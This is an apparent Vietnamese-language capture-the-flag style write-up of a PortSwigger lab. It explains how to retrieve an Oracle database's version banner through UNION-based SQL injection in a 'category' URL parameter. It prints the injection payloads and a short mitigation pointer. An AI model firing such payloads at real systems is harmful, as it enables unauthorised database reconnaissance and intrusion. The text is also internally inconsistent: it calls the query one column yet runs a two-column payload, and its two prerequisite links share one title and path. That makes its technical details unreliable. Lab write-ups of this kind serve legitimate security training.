

**Metadata:**
* **Target:** [PortSwigger Lab: Querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
**Prerequisite Knowledge:** Cần nắm vững kỹ thuật tìm số lượng cột và cột chứa kiểu String ở bài viết [Methodology_Column&Data_Type_Enumeration](../../Methodology/Methodology_Column&Data_Type_Enumeration.md) và Xác định hệ quản trị ở bài viết [Methodology_Column&Data_Type_Enumeration](../../Methodology/Methodology_Column&Data_Type_Enumeration.md)
---

## 1. Objective & Attack Surface 
* **Mục tiêu:** Sử dụng kỹ thuật **UNION attack** để trích xuất và hiển thị chuỗi thông tin phiên bản (Version string) của hệ quản trị cơ sở dữ liệu **Oracle**.
* **Tham số Mục tiêu:** Lỗ hổng nằm ở tính năng lọc sản phẩm thông qua tham số `category` trên thanh URL:
  `GET /filter?category=Gifts HTTP/1.1`

## 2. Oracle SQL Specifics 

Khác với các hệ thống như MySQL hay PostgreSQL, chuẩn cú pháp của **Oracle SQL** có quy định rất nghiêm ngặt: 
* Bắt buộc mọi câu lệnh `SELECT` đều phải đi kèm với mệnh đề `FROM`. 
* Khi muốn thực thi một câu truy vấn độc lập (không nhắm vào một bảng cụ thể nào), ta bắt buộc phải truy vấn từ một bảng ảo (built-in dummy table) mặc định của hệ thống có tên là `DUAL`.
* Thông tin về phiên bản của Oracle được lưu trữ trong một bảng hệ thống (System Catalog) có tên là `v$version`.

## 3. Payload Crafting & Exploitation (Xây dựng Payload)

Dựa trên cấu trúc truy vấn gốc (đã biết trước gồm 1 cột) và đặc thù của Oracle, ta tiến hành xây dựng **Payload** trích xuất phiên bản:

* **Payload:** `'+UNION+SELECT+banner+FROM+v$version--+`

* **Thực thi vào URL:**
  `https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+banner,+NULL+FROM+v$version--+`

* **Kết quả:**
  Hệ thống xử lý truy vấn thành công. **DBMS** sẽ lấy dữ liệu từ cột `banner` của bảng `v$version` và gộp vào tập kết quả trả về. Giao diện **Web Application** sẽ hiển thị trực tiếp chuỗi phiên bản

## 4. Root Cause & Mitigation (Tham chiếu)
* Nguyên nhân gốc rễ và chiến lược khắc phục hoàn toàn tương tự như kiến trúc SQLi nền tảng (Thiếu Sanitization và khuyến nghị sử dụng Parameterized Queries).
* Chi tiết vui lòng tham khảo: [Lab 1: SQLi in WHERE clause allowing retrieval of hidden data#4. Root Cause Analysis - RCA](./Lab 1: SQLi in WHERE clause allowing retrieval of hidden data#4. Root Cause Analysis - RCA.md).